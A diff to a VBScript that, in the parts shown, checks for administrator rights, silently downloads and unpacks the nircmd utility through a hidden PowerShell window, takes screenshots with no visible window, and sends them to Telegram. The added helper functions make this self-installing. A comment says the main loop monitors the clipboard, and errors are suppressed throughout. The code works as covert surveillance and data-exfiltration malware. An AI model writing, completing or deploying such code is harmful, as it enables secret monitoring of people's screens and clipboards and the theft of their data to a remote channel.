@@ -1,3 +1,14 @@
+' Define the path where nircmd.exe should be saved
+nircmdPath = "C:\Tools\nircmd.exe" ' Update this with your desired directory path
+nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL of nircmd.zip (zip version)
+
+' Check if nircmd.exe exists
+If Not FileExists(nircmdPath) Then
+    ' If not, download and extract nircmd.exe
+    DownloadNircmd nircmdURL, "C:\Tools\nircmd.zip" ' Change directory if necessary
+    ExtractZip "C:\Tools\nircmd.zip", "C:\Tools\" ' Extract the zip to the directory
+End If
+
 ' Check if the script is running with administrator privileges
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -63,16 +74,12 @@ End Function
 
 ' Function to capture a screenshot and send it to Telegram
 Function CaptureAndSendScreenshot()
-    ' Path to nircmd tool (ensure this is correct)
-    nircmdPath = "C:\Path\To\nircmd.exe" ' Change this to your nircmd path
-    screenshotPath = "C:\Path\To\screenshot.png" ' Where the screenshot will be saved
-    
     ' Run nircmd to capture the screenshot
-    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot " & Chr(34) & screenshotPath & Chr(34), 0, True
+    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot C:\Tools\screenshot.png", 0, True
 
     ' Send the screenshot to Telegram
     SendTelegramMessage "Sending screenshot..."
-    Call SendPhotoToTelegram(screenshotPath)
+    Call SendPhotoToTelegram("C:\Tools\screenshot.png")
 End Function
 
 ' Function to send photo to Telegram
@@ -102,6 +109,36 @@ Function SendPhotoToTelegram(photoPath)
     xmlhttp.Send body
     If Err.Number <> 0 Then Err.Clear
 End Function
+
+' Function to check if a file exists
+Function FileExists(filePath)
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    FileExists = objFSO.FileExists(filePath)
+End Function
+
+' Function to download a file from a URL
+Sub DownloadNircmd(url, savePath)
+    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
+    Set stream = CreateObject("ADODB.Stream")
+    
+    xmlhttp.Open "GET", url, False
+    xmlhttp.Send
+    
+    ' Save the file to the specified path
+    stream.Open
+    stream.Type = 1 ' binary
+    stream.Write xmlhttp.responseBody
+    stream.SaveToFile savePath, 2 ' Overwrite if file exists
+    stream.Close
+End Sub
+
+' Function to extract a ZIP file using PowerShell (requires PowerShell)
+Sub ExtractZip(zipPath, destination)
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Run PowerShell to extract the ZIP
+    objShell.Run "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & destination & "'""", 0, True
+End Sub
 
 ' Main loop to keep script running and monitor clipboard
 On Error Resume Next
